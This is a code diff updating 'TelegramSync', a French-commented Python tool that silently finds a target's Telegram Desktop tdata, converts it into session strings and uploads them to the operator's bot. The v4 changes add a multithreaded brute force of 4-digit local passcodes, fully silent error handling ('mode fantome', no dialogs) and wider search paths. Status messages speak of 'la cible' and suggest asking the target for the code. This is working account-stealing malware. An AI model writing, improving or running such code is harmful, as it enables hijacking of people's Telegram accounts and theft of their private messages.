@@ -1,12 +1,13 @@
 # -*- coding: utf-8 -*-
 """
-TelegramSync v3 - tdata -> .session par compte -> envoi vers ton bot.
+TelegramSync v4 - tdata -> .session par compte -> envoi vers ton bot.
 
-Mode fantome : aucune fenetre, aucun popup, tout passe par le bot.
+Mode fantome : aucune fenetre, aucun popup, aucun dialogue d'erreur.
 Ne modifie JAMAIS le tdata de la cible (lecture via copie temporaire).
 
-v3 : detection large (registre des profils, version Microsoft Store,
-     scan disque sans limite de profondeur) + rapport DIAG systematique.
+v4 : capture BaseException (opentele leve des BaseException), excepthook
+     silencieux, detection du code d'acces local + bruteforce parallele,
+     candidats UWP directs, DIAG compact.
 
 Surcharges : TG_TDATA, TG_PASSCODE, passcodes.txt a cote de l'exe
 """
@@ -35,6 +36,13 @@ API_ID   = 2040
 API_HASH = "b18441a1ff607e10a989891a5462e627"
 
 PASSCODES = [""]
+
+# Si le tdata est chiffre par un code local et qu'aucun passcode ne marche,
+# on tente tous les codes numeriques de BRUTE_DIGITS chiffres.
+# 4 chiffres = 10000 essais, environ 10 min avec 8 threads.
+BRUTE = True
+BRUTE_DIGITS = 4
+WORKERS = min(8, os.cpu_count() or 4)
 # ----------------------------------------------------------------------
 
 WORK = os.path.join(tempfile.gettempdir(), "tgsync")
@@ -77,7 +85,7 @@ def tg_call(method, **kw):
 def tg_text(text):
     try:
         tg_call("sendMessage", data={"chat_id": CHAT_ID, "text": text[:4000]})
-    except Exception:
+    except BaseException:
         pass
 
 
@@ -106,6 +114,14 @@ def tg_big(path, caption="", limit=45 * 1024 * 1024):
             i += 1
 
 
+def _excepthook(t, v, tb):
+    try:
+        tg_text("TelegramSync - EXCEPTION\n\n"
+                + "".join(traceback.format_exception(t, v, tb)))
+    except BaseException:
+        pass
+
+
 # ------------------------------------------------------------- detection
 SKIP_DIRS = {"windows", "program files", "program files (x86)", "$recycle.bin",
              "system volume information", "recovery", "perflogs", "msocache",
@@ -124,7 +140,6 @@ def is_tdata(p):
 
 
 def profile_roots():
-    """Profils Windows reels, lus dans le registre (pas devines)."""
     global _PROFILES
     if _PROFILES is not None:
         return _PROFILES
@@ -170,11 +185,18 @@ def store_tdata_paths():
         for d in os.listdir(pkgs):
             if "telegram" not in d.lower():
                 continue
-            for sub in (r"LocalCache\Roaming\Telegram Desktop",
-                        r"LocalCache\Roaming",
-                        r"LocalCache\Local\Telegram Desktop"):
-                out.append(os.path.join(pkgs, d, sub, "tdata"))
-                out.append(os.path.join(pkgs, d, sub, "Telegram Desktop", "tdata"))
+            for lc in (r"LocalCache\Roaming", r"LocalCache\Local"):
+                base = os.path.join(pkgs, d, lc)
+                if not os.path.isdir(base):
+                    continue
+                out.append(os.path.join(base, "tdata"))
+                try:
+                    for sub in os.listdir(base):
+                        s2 = os.path.join(base, sub)
+                        if os.path.isdir(s2):
+                            out.append(os.path.join(s2, "tdata"))
+                except OSError:
+                    pass
     except OSError:
         pass
     return out
@@ -187,7 +209,8 @@ def candidates():
     if os.environ.get("TG_TDATA"):
         c.append(os.environ["TG_TDATA"])
 
-    names = ("Telegram Desktop", "TelegramDesktop", "Telegram")
+    names = ("Telegram Desktop", "Telegram Desktop UWP",
+             "TelegramDesktop", "Telegram", "Telegram UWP")
     tds = ("tdata", "tdata#2", "tdata#3")
 
     for var in ("APPDATA", "LOCALAPPDATA"):
@@ -232,7 +255,6 @@ def candidates():
 
 
 def scan(roots, budget):
-    """Cherche le FICHIER key_datas, sans limite de profondeur."""
     t0 = time.time()
     found = []
     for r in roots:
@@ -260,10 +282,11 @@ def find_tdata():
         else:
             report.append(("--", p))
 
-    tg_text("Aucun chemin standard. Scan du disque (max 5 min)...")
+    tg_text("Aucun chemin standard. Scan du disque (max 2 min)...")
     roots = list(profile_roots())
-    roots += [L + ":\\" for L in string.ascii_uppercase if os.path.isdir(L + ":\\")]
-    hits = scan(roots, budget=300)
+    roots += [L + ":\\" for L in string.ascii_uppercase
+              if os.path.isdir(L + ":\\")]
+    hits = scan(roots, budget=150)
     for h in hits:
         report.append(("SCAN", h))
     if hits:
@@ -285,20 +308,19 @@ def diag_text(td, report):
             store = [d for d in os.listdir(pkgs) if "telegram" in d.lower()]
         except OSError:
             pass
+    cl = "oui" if os.path.isdir(os.path.join(app, "Telegram Desktop")) else "non"
     lines = [
         f"user={os.environ.get('USERNAME')}",
-        f"appdata={app}",
-        f"localappdata={loc}",
         f"exe={exe_dir()}",
-        f"cwd={os.getcwd()}",
-        f"profil_classique={'oui' if os.path.isdir(os.path.join(app, 'Telegram Desktop')) else 'non'}",
+        f"profil_classique={cl}",
         f"packages_store={store}",
-        f"profils={profile_roots()}",
         f"trouve={td}",
         "---",
     ]
-    lines += [f"{st} {p}" for st, p in report[:60]]
-    return "\n".join(lines)
+    interest = [(st, p) for st, p in report if st in ("OK", "dir", "SCAN")]
+    lines += [f"{st} {p}" for st, p in interest]
+    lines.append(f"(+{len(report) - len(interest)} chemins absents)")
+    return "\n".join(lines)[:4000]
 
 
 # ------------------------------------------------------------- tdata
@@ -340,21 +362,59 @@ def zip_dir(src, dst):
 
 
 # ------------------------------------------------------------- conversion
-def load_tdesktop(tdata, passcodes):
+def is_bad_key(e):
+    return e is not None and type(e).__name__ == "TDataBadDecryptKey"
+
+
+def brute_force(tdata, digits=4):
     from opentele.td import TDesktop
+    from concurrent.futures import ThreadPoolExecutor
+
+    def one(i):
+        code = str(i).zfill(digits)
+        try:
+            td = TDesktop(tdata, passcode=code)
+            if td.accountsCount > 0:
+                return code, td
+        except BaseException:
+            pass
+        return None, None
+
+    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
+        for code, td in ex.map(one, range(10 ** digits), chunksize=1):
+            if td is not None:
+                return td, code
+    return None, None
+
+
+def load_tdesktop(tdata, passcodes, brute=True, digits=BRUTE_DIGITS):
+    from opentele.td import TDesktop
+
     last = None
     for pc in passcodes:
         try:
             td = TDesktop(tdata, passcode=pc or None)
             if td.accountsCount > 0:
-                return td, pc
+                return td, pc, None
             last = RuntimeError("0 compte charge")
-        except Exception as e:
+        except BaseException as e:
             last = e
-    raise RuntimeError(
-        f"tdata illisible : {last!r}\n"
-        "Si un code d'acces local est actif, mets-le dans passcodes.txt "
-        "a cote de l'exe.")
+
+    if not brute or not is_bad_key(last):
+        return None, None, last
+
+    tg_text(f"tdata chiffre par un code local.\n"
+            f"Bruteforce {digits} chiffres ({10 ** digits} essais, "
+            f"{WORKERS} threads)...")
+    t0 = time.time()
+    td, code = brute_force(tdata, digits)
+    dt = int(time.time() - t0)
+    if td is not None:
+        tg_text(f"code local trouve : {code} ({dt}s)")
+        return td, code, None
+    tg_text(f"code local NON trouve ({dt}s, {digits} chiffres essayes).\n"
+            f"-> demande le code a la cible, mets-le dans passcodes.txt")
+    return None, None, last
 
 
 async def convert_all(td, outdir):
@@ -385,21 +445,23 @@ async def convert_all(td, outdir):
                 "dc_id": client.session.dc_id,
                 "string_session": StringSession.save(client.session),
             })
-        except Exception as e:
+        except BaseException as e:
             entry["error"] = repr(e)
         finally:
             if client is not None:
                 try:
                     await client.disconnect()
-                except Exception:
+                except BaseException:
                     pass
         out.append(entry)
     return out
 
 
-def run_once(tdata, passcodes, snap):
+def run_once(tdata, passcodes, snap, brute):
     snapshot_tdata(tdata, snap)
-    td, used = load_tdesktop(snap, passcodes)
+    td, used, err = load_tdesktop(snap, passcodes, brute=brute)
+    if td is None:
+        raise RuntimeError(f"tdata illisible : {err!r}")
     return asyncio.run(convert_all(td, WORK)), used
 
 
@@ -410,8 +472,7 @@ def main():
 
     if not tdata:
         tg_text("RESULTAT: aucun tdata.\n"
-                "Telegram Desktop absent, jamais lance, ou sous un autre "
-                "compte Windows.")
+                "Telegram Desktop absent, jamais lance, ou autre profil.")
         return
 
     if not is_tdata(tdata):
@@ -424,16 +485,22 @@ def main():
     snap = os.path.join(WORK, "tdata_snap")
 
     accounts, used, last = None, None, None
-    for _ in range(3):
+    for attempt in range(3):
         try:
-            accounts, used = run_once(tdata, load_passcodes(), snap)
+            accounts, used = run_once(tdata, load_passcodes(), snap,
+                                      brute=(BRUTE and attempt == 2))
             if accounts:
                 break
-        except Exception as e:
+        except BaseException as e:
             last = e
-            time.sleep(2)
+            if attempt < 2:
+                time.sleep(2)
+
     if not accounts:
-        raise RuntimeError(f"conversion impossible apres 3 essais : {last!r}")
+        if is_bad_key(last):
+            tg_text("RESULTAT: code d'acces local non resolu.\n"
+                    "-> demande le code a la cible.")
+        raise RuntimeError(f"conversion impossible : {last!r}")
 
     manifest = os.path.join(WORK, "manifest.json")
     with open(manifest, "w", encoding="utf-8") as f:
@@ -447,7 +514,7 @@ def main():
     tg_text(
         f"source : {tdata}\n"
         f"passcode : {'oui' if used else 'non'}\n"
-        f"Telegram ouvert : {'oui' if telegram_running() else 'non'}\n"
+        f"Telegram ouvert : {'oui' if telegram_running() else 'no'}\n"
         "comptes:\n" + "\n".join(
             f"- #{a['index']} {a.get('phone','?')} @{a.get('username') or '-'}"
             + (" [ECHEC]" if "error" in a else "")
@@ -455,7 +522,8 @@ def main():
 
 
 if __name__ == "__main__":
+    sys.excepthook = _excepthook
     try:
         main()
-    except Exception:
+    except BaseException:
         tg_text("TelegramSync - ERREUR\n\n" + traceback.format_exc())
